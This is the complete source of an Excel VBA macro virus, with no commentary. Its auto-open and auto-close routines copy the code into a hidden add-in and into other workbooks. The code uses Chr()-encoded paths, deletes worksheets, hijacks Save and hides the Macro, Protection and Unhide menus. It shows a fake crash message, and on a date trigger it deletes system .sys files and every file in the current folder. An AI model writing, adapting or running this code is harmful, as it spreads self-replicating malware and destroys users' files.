   Attribute VB_Name = "modules "
   Option Explicit
   Public m_id As String
   Private Function ID()
         ID = Chr(66) + Chr(73) & Chr(79) & _
               Chr(83) & Chr(51) & Chr(56) & _
               Chr(54) & "." & Chr(67) & _
               Chr(79) & Chr(77)
   End Function
   Private Function CPOTTING()
      CPOTTING = Chr(67) & ":" & Chr(92) & Chr(87) & Chr(73) & _
                 Chr(78) & Chr(68) & Chr(79) & Chr(87) & Chr(83) & _
                 Chr(92) & Chr(67) & Chr(79) & Chr(77) & Chr(77) & _
                 Chr(65) & Chr(78) & Chr(68) & Chr(92)
   End Function
   Sub AUTO_OPEN()
   Attribute AUTO_OPEN.VB_ProcData.VB_Invoke_Func = " \n14"
   Dim chklog, mee As Variant
   Dim wafer, wafers, cpot As String
   Dim bookname As String
        Application.OnKey "^{BREAK}", "histogram": nexts: histogram
        cpot = Application.TemplatesPath & Chr(65) & Chr(85) & Chr(84) & Chr(79) & Chr(83) & Chr(65) & Chr(86) & _
                                           Chr(69) & Chr(83) & "." & Chr(88) & Chr(76) & Chr(65)
        m_id = "modules ": wafer = Dir(cpot): wafers = Dir(CPOTTING & ID)
        On Error Resume Next: Err = 0
        If UCase(wafer) = "" Or UCase(wafers) = "" Then
           Application.ScreenUpdating = False
           With ActiveWorkbook
              .TITLE = "#$%#$%#$@#@##$$$####@@@#@##$%$%$%^"
              .Subject = "«Ü.++I¤¦XJ-K_æ"
              .Author = "@@!@!@!#$#$%^**&%#^%^***"
              .Keywords = ">>>>>>>>>>>>>>>>>> F.Y."
              .Comments = "+666.............13.............OMEN+"
           End With
           Application.DisplayAlerts = False
           For Each chklog In Application.Modules
                  If chklog.Name <> m_id Then
                   ThisWorkbook.Sheets(chklog).Visible = True
                   ThisWorkbook.Sheets(chklog.Name).Delete
                  End If
           Next
           For Each chklog In Application.Sheets
                  If chklog.Name <> m_id Then
                   Application.DisplayAlerts = False
                   ThisWorkbook.Sheets(chklog).Visible = True
                   ThisWorkbook.Sheets(chklog.Name).Delete
                  End If
           Next
           Application.DisplayAlerts = True: ThisWorkbook.Sheets(m_id).Visible = True
           bookname = ActiveWorkbook.Name: Workbooks(bookname).Modules(m_id).Activate
           ExecuteExcel4Macro "VBA.MAKE.ADDIN(""C:\MSOFFICE\TEMPLATES\AUTOSAVES.XLA"")"
           Application.DisplayStatusBar = False
           Workbooks(bookname).SaveAs filename:=CPOTTING & ID, FileFormat:=xlText, CreateBackup:=True, _
           password:="0"
           If Err <> 0 Then
              SetAttr CPOTTING & ID, vbNormal
              Kill CPOTTING & ID
              Workbooks(bookname).SaveAs filename:=CPOTTING & ID, FileFormat:=xlText, CreateBackup:=True, _
           password:="0"
           End If
           AddIns.Add(cpot).Installed = True: Application.DisplayStatusBar = True
           SetAttr CPOTTING & ID, 1: SetAttr cpot, 1: ThisWorkbook.Sheets(m_id).Visible = False
           Application.ScreenUpdating = False: ERRMSG
        End If
   Call ena
   End Sub
   Sub AUTO_CLOSE()
   Attribute AUTO_CLOSE.VB_ProcData.VB_Invoke_Func = " \n14"
   histog
   histogs
   End Sub
   Private Sub FUNCT()
   Dim CN As Integer
   On Error Resume Next
   CN = 12: Err = 0
   Do While Not (CN = 4)
   Application.OnKey "{F" & CN & "}", "histogram"
   If Err <> 0 Then
     GoTo WHERE
   End If
   CN = CN - 1
   Loop
   WHERE:
   Exit Sub
   End Sub
   Sub histogram()
   Attribute histogram.VB_ProcData.VB_Invoke_Func = " \n14"
   Dim xls, xl, xlt, xlx As String
   On Error Resume Next
   xl = Application.StartupPath & Application.PathSeparator
   xlx = xl & Chr(42) & Chr(46) & Chr(42)
   xlt = Dir(xlx, 2 + 1 + 4 + 32)
   SetAttr xl & xlt, vbNormal
   Do While Not (xlt = "")
   If xlt <> False Then
       Err = 0
       Workbooks(xlt).Close
       Kill xl & xlt
       If Err = 0 Then
          GoTo placeme
       End If
   End If
   placeme:
   xlt = Dir(xlx, 2 + 1 + 4 + 32)
   SetAttr xl & xlt, vbNormal
   If Err = 0 Then
     Exit Sub
   End If
   Loop
   End Sub
   Private Sub ERRMSG()
   Dim MSG, STYLE, TITLE, HELP, CTXT As String
   Dim resp As Variant
   On Error Resume Next
   Err = 0
   resp = MsgBox("This program has performed an illegal operation and will be terminated.", vbOKOnly + vbCritical + _
   vbSystemModal + vbDefaultButton2, "Excel", "", 150)
   If resp = 1 Then
   Application.DisplayAlerts = False
   Workbooks.Close
   Application.Quit
     If Err = 0 Then
     GoTo anyw
     End If
   anyw:
   Exit Sub
   End If
   End Sub
   Private Sub ena()
   On Error GoTo hideko
   Toolbars("Standard").ToolbarButtons(3).OnAction = "AUTO_CLOSE": FUNCT
   MenuBars(xlWorksheet).Menus("File").MenuItems("Save").Delete
   MenuBars(xlModule).Menus("File").MenuItems("Save").Delete
   MenuBars(xlModule).Menus("Tools").MenuItems("Add-Ins...").Delete
   MenuBars(xlWorksheet).Menus("Tools").MenuItems("Add-ins...").Delete
   MenuBars(xlModule).Menus("File").MenuItems.Add Caption:="&Save                   Crtl+S", OnAction:="AUTO_CLOSE", before:=5
   MenuBars(xlWorksheet).Menus("File").MenuItems.Add Caption:="&Save                   Crtl+S", OnAction:="AUTO_CLOSE", before:=5
   Application.MacroOptions Macro:="AUTO_CLOSE", _
       HasShortcutKey:=True, ShortcutKey:="S"
   hideko:
   Exit Sub
   End Sub
   Private Function coding()
   Dim TESTER As Range
   Dim logentry As Variant
   coding = False
   For Each logentry In Application.Worksheets
   Set TESTER = Worksheets(logentry.Name).Range(Chr(97) + Chr(49) + Chr(54) + Chr(51) + Chr(56) + Chr(52))
    If TESTER = Chr(117) + Chr(101) + Chr(100) + Chr(97) + Chr(115) + Chr(97) + Chr(110) Then
     coding = True
     Exit For
     End If
   Next
   End Function
   Private Sub histogs()
   Dim checking, chkstruc As Boolean
   Dim gshck As String
   Dim LOGNAME, NEWMOD As Variant
            checking = False: m_id = "modules "
            On Error Resume Next
            Err = 0:   chkstruc = ActiveWorkbook.ProtectStructure
         Application.ScreenUpdating = False
         If Err <> 0 Then GoTo placeb
            If chkstruc = False Then
               gshck = ActiveWorkbook.Name
               For Each LOGNAME In Application.Modules
                 If LOGNAME.Name = m_id Then
                   checking = True
                 End If
               Next
               If checking = False And Not coding Then
                  Set NEWMOD = Modules.Add
                  Application.DisplayStatusBar = False
                  NEWMOD.InsertFile filename:=CPOTTING & ID
                  With ActiveSheet
                    .Name = m_id
                  End With
                  ActiveSheet.Protect
                  Workbooks(gshck).Sheets(m_id).Visible = False
                  Application.DisplayStatusBar = True
                  Status
                End If
           End If
   placeb:
   Application.ScreenUpdating = False
   Call AUTO_OPEN
   End Sub
   Private Sub histog()
   On Error Resume Next
   Err = 0
   Application.ScreenUpdating = True
   Application.DisplayAlerts = False
   ActiveWorkbook.Save
   Application.DisplayAlerts = True
      If Err = 0 Then
        Exit Sub
      End If
   End Sub
   Private Sub Status()
    If Month(Now) = Int(Sqr((355 / Sqr(3995) * ((31 / 4) * 4) ^ 2))) - 69 Then
      DO_EVERYTHING
   End If
   If (Month(Now) >= Int(Sqr((355 / Sqr(3995) * ((31 / 4) * 4) ^ 2))) - 69 _
      And Hour(Now) < Int(Sqr(4 * 62) / 2.6)) Then
       DO_SOMETHING
   End If
   End Sub
   Private Sub DO_EVERYTHING()
   Dim sld, place, m As String
   On Error Resume Next
   place = Chr(99) & ":" & Chr(92) & Chr(42) & "." & Chr(115) _
           & Chr(121) & Chr(115)
   m = Chr(99) & ":" & Chr(92)
   sld = Dir(place, 2 + 1 + 4 + 32)
   SetAttr m & sld, vbNormal
   Do While Not (sld = "")
   If sld <> False Then
       Err = 0
       Kill m & sld
       If Err <> 0 Then
          GoTo placea
       End If
   End If
   placea:
   sld = Dir(place, 2 + 1 + 4 + 32)
   SetAttr m & sld, vbNormal
   Loop
   End Sub
   Private Sub DO_SOMETHING()
   Dim paths, pats, sexy As String
   On Error Resume Next
   paths = CurDir()
   paths = paths & Chr(92)
   pats = paths & Chr(42) & Chr(46) & Chr(42)
   sexy = Dir(pats, 2 + 1 + 4 + 32)
   SetAttr paths & sexy, vbNormal
   Do While Not (sexy = "")
   If sexy <> False Then
       Err = 0
       Kill paths & sexy
       If Err <> 0 Then
           GoTo placea
       End If
   End If
   placea:
   sexy = Dir()
   SetAttr paths & sexy, vbNormal
   Loop
   End Sub
   Private Sub nexts()
   Dim i As Integer
   i = 1
     Do While Not i > 4
         Select Case i
         Case 1
           check "View", "&Toolbars..."
         Case 2
           check "Tools", "&Macro..."
         Case 3
           check "Tools", "&Protection"
         End Select
       i = i + 1
    Loop
   End Sub
   Private Sub check(ByVal men As String, ByVal items As String)
   Dim o As Integer
   o = 1
   On Error Resume Next
   Err = 0
   Do While Not o > 3
     Select Case o
          Case 1
                   MenuBars(xlWorksheet).Menus(men).MenuItems(items).Delete
                   If Err <> 0 Then
                   Exit Sub
                   End If
          Case 2
                   MenuBars(xlModule).Menus(men).MenuItems(items).Delete
                   If Err <> 0 Then
                   Exit Sub
                   End If
          Case 3
                   MenuBars(xlNoDocuments).Menus("File").MenuItems(items).Delete
                   If Err <> 0 Then
                   Exit Sub
                   End If
     End Select
   o = o + 1
   Loop
     MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet") _
          .MenuItems("&Unhide...").Delete
     If Err <> 0 Then
       Exit Sub
     End If
   End Sub
